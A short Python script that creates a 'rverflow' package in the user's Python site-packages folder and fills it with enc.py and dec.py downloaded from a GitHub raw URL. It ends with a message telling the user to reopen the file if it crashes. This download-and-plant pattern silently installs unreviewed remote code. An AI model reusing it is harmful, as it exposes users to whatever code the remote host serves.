import os, getpass, platform, requests, time
ver = platform.python_version().split(".");ver.pop();ver = ''.join(ver)
rpath = f"C:/Users/{getpass.getuser()}/AppData/Local/Programs/Python/Python{ver}/Lib/site-packages/rverflow"
os.mkdir(rpath)
with open(rpath + "/__init__.py", "w+", encoding="utf-8") as f:
	f.write("from .dec import dcr;from .enc import ecr")
with open(rpath + "/dec.py", "w+", encoding="utf-8") as dec:
	r = requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/rverflow/dec.py")
	r.encoding = "utf-8"
	res = r.content.decode()
	dec.write(res)
with open(rpath + "/enc.py", "w+", encoding="utf-8") as enc:
	r2 = requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/rverflow/enc.py")
	r2.encoding = "utf-8"
	res2 = r2.content.decode()
	enc.write(res2)
'fart'
print("if this file crashes, try reopening it, it should reload the module and work again")
time.sleep(3)
